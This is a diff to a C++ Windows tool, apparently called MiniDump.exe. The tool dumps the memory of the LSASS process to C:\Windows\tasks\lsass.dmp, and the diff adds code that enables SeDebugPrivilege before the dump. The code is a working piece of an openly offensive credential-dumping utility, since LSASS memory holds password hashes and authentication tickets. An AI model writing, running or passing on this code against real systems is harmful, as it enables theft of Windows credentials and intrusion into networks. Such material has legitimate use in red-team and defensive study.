@@ -1,8 +1,7 @@
 ﻿#include <Windows.h>
-#include <stdio.h>
 #include <minidumpapiset.h>
 #include <DbgHelp.h>
-#include <string>
+#include <stdio.h>
 
 #pragma comment(lib, "DbgHelp.lib")
 
@@ -12,11 +11,22 @@ int main(int argc, char* argv[]) {
 		printf("Usage: MiniDump.exe <PID>\n");
 		return EXIT_FAILURE;
 	}
-
+	
 	LPCWSTR filePath = L"C:\\Windows\\tasks\\lsass.dmp";
 	HANDLE hProcess, hFile;
 	DWORD LsassProcessID = atoi(argv[1]);
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tkp;
 	bool dumped;
+
+	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
+	tkp.PrivilegeCount = 1;
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
+
+	printf("[+] SeDebugPrivilege Enabled\n");
+
 
 	printf("[+] Got lsass.exe PID: %lu\n", LsassProcessID);
 
@@ -67,6 +77,7 @@ int main(int argc, char* argv[]) {
 		printf("[-] Error dumping LSASS memory 0x%lx\n", ::GetLastError());
 	}
 
+	CloseHandle(hToken);
 	CloseHandle(hProcess);
 	CloseHandle(hFile);
 
